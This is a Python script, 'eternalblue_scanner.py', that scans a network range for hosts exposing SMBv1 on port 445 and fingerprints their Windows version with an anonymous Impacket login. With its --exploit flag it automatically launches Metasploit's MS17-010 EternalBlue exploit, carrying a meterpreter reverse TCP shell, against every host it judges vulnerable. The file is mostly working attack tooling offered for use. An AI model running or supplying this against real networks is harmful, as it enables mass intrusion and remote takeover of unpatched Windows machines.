#!/usr/bin/env python3
"""
eternalblue_scanner.py v3
  - Scans a CIDR for port 445
  - Fingerprints SMBv1 + OS version
  - (Optionally) kicks off a Metasploit EternalBlue exploit
"""

import sys
import socket
import ipaddress
import subprocess
from impacket.smbconnection import SMBConnection

def is_smb1(ip, timeout=3):
    """Check if port 445 is open and responds to a basic SMB1 negotiate."""
    try:
        sock = socket.create_connection((ip, 445), timeout=timeout)
        # SMB1 Negotiate Protocol Request (minimal)
        negotiate = bytes.fromhex(
            "00000090"      # NetBIOS header
            "ff534d42"      # SMB Header + Negotiate command
            "72000000"      # NTStatus + flags
            "00000000000000000000000000000000"
            "0000"          # WordCount
            "31"            # ByteCount
            "02"            # Dialect buffer format
            "4c414e4d414e4e312e3000"  # LANMAN1.0
            "02" "4e54204c4d20302e313200"  # NT LM 0.12
        )
        sock.send(negotiate)
        resp = sock.recv(1024)
        sock.close()
        return resp[4:8] == b'\xffSMB'
    except Exception:
        return False

def get_smb_os(ip):
    """Use Impacket to connect and pull the server OS string."""
    try:
        smb = SMBConnection(ip, ip, timeout=5)
        smb.login('', '')  # anonymous
        os_info = smb.getServerOS()
        smb.logoff()
        return os_info
    except Exception as e:
        return f"<error: {e}>"

def exploit_with_msf(ip, lhost, lport=4444):
    """
    Kicks off Metasploit EternalBlue exploit.
    Requires msfconsole on your PATH.
    """
    cmd = (
        f"msfconsole -q -x "
        f"\"use exploit/windows/smb/ms17_010_eternalblue; "
        f"set RHOSTS {ip}; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
        f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
        f"run; exit\""
    )
    subprocess.run(cmd, shell=True)

def scan_cidr(cidr, do_exploit=False, lhost=None, lport=4444):
    network = ipaddress.ip_network(cidr)
    print(f"Scanning {network.num_addresses} addresses in {cidr}...\n")
    for host in network.hosts():
        ip = str(host)
        sys.stdout.write(f"[~] {ip:15} ")
        sys.stdout.flush()

        if not is_smb1(ip):
            print("port 445 closed / no SMB1")
            continue

        os_str = get_smb_os(ip)
        print(f"SMB1 open | OS: {os_str}")

        # crude vulnerability filter: Windows 7/2008 or 8.0/8.1 pre-patch
        if any(x in os_str for x in ("Windows 6.1", "Windows 6.2", "Windows 6.3")):
            print(f"  [+] Likely MS17-010 target", end="")
            if do_exploit and lhost:
                print(" → Exploiting!")
                exploit_with_msf(ip, lhost, lport)
            else:
                print()
        else:
            print("  [!] SMB1 but OS not in vuln list")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="EternalBlue Subnet Scanner + Exploit")
    p.add_argument("cidr", help="e.g. 192.168.1.0/24")
    p.add_argument("--exploit", action="store_true",
                   help="automatically launch Metasploit exploit")
    p.add_argument("--lhost", help="your listener IP (required if --exploit)")
    p.add_argument("--lport", type=int, default=4444,
                   help="listener port (default 4444)")
    args = p.parse_args()

    if args.exploit and not args.lhost:
        p.error("--exploit requires --lhost")

    scan_cidr(args.cidr, do_exploit=args.exploit,
              lhost=args.lhost, lport=args.lport)
